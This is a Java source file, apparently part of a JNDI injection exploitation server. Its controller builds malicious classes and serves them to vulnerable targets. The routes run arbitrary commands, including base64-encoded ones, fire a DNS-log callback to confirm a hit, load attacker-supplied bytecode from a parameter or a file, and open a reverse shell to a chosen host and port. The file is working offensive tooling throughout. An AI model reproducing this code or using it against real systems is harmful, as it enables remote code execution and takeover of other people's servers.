package com.example.exploit.controller;

import com.example.exploit.annotation.JNDIController;
import com.example.exploit.annotation.JNDIMapping;
import com.example.exploit.server.FileHandler;
import com.example.exploit.server.WebServer;
import com.example.exploit.template.ReverseShellTemplate;
import com.example.exploit.util.MiscUtil;
import com.example.exploit.util.ReflectUtil;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Hashtable;

@JNDIController
@JNDIMapping("/Basic")
public class BasicController {
    public Hashtable<String, Object> process(Hashtable<String, String> params) throws Exception {
        String codebase = params.get("codebase");
        String className = params.get("className");
        byte[] byteCode = Base64.getDecoder().decode(params.get("byteCode"));

        WebServer.httpServer.createContext("/" + className + ".class", new FileHandler(byteCode));

        Hashtable<String, Object> result = new Hashtable<>();
        result.put("codebase", codebase);
        result.put("factory", className);
        return result;
    }

    @JNDIMapping("/DnsLog/{url}")
    public void dnsLog(Hashtable<String, String> params) throws Exception {
        String className = MiscUtil.getRandStr(12);
        String url = params.get("url");

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(className);
        String body = String.format("new java.net.URL(\"%s\").hashCode();", url);
        clazz.makeClassInitializer().setBody(body);

        System.out.println("DnsLog: " + url);
        params.put("className", className);
        params.put("byteCode", Base64.getEncoder().encodeToString(clazz.toBytecode()));
    }

    @JNDIMapping("/Command/{cmd}")
    public void command(Hashtable<String, String> params) throws Exception {
        String className = MiscUtil.getRandStr(12);
        String cmd = params.get("cmd");

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(className);
        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", cmd);
        clazz.makeClassInitializer().setBody(body);

        System.out.println("Cmd: " + cmd);
        params.put("className", className);
        params.put("byteCode", Base64.getEncoder().encodeToString(clazz.toBytecode()));
    }

    @JNDIMapping("/Command/Base64/{cmd}")
    public void b64Command(Hashtable<String, String> params) throws Exception {
        String cmd = new String(Base64.getUrlDecoder().decode(params.get("cmd")));
        params.replace("cmd", cmd);
        this.command(params);
    }

    @JNDIMapping("/FromCode/{code}")
    public void fromCode(Hashtable<String, String> params) throws Exception {
        String className = MiscUtil.getRandStr(12);
        byte[] code = Base64.getUrlDecoder().decode(params.get("code"));

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(new ClassFile(new DataInputStream(new ByteArrayInputStream(code))));
        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("FromCode ClassName: " + clazz.getName() + " Length: " + code.length);
        params.put("className", className);
        params.put("byteCode", Base64.getEncoder().encodeToString(clazz.toBytecode()));
    }

    @JNDIMapping("/FromPath/{path}")
    public void fromPath(Hashtable<String, String> params) throws Exception {
        String className = MiscUtil.getRandStr(12);
        String path = new String(Base64.getUrlDecoder().decode(params.get("path")));
        byte[] data = Files.readAllBytes(Paths.get(path));

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(new ClassFile(new DataInputStream(new ByteArrayInputStream(data))));
        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("FromPath ClassName: " + clazz.getName() + " Path: " + path + " Length: " + data.length);
        params.put("className", className);
        params.put("byteCode", Base64.getEncoder().encodeToString(clazz.toBytecode()));
    }

    @JNDIMapping("/ReverseShell/{host}/{port}")
    public void reverseShell(Hashtable<String, String> params) throws Exception {
        String className = MiscUtil.getRandStr(12);
        String host = params.get("host");
        int port = Integer.parseInt(params.get("port"));

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));

        System.out.println("ReverseShell ClassName: " + clazz.getName() + " Host: " + host + " Port: " + port);
        params.put("className", className);
        params.put("byteCode", Base64.getEncoder().encodeToString(clazz.toBytecode()));
    }
}
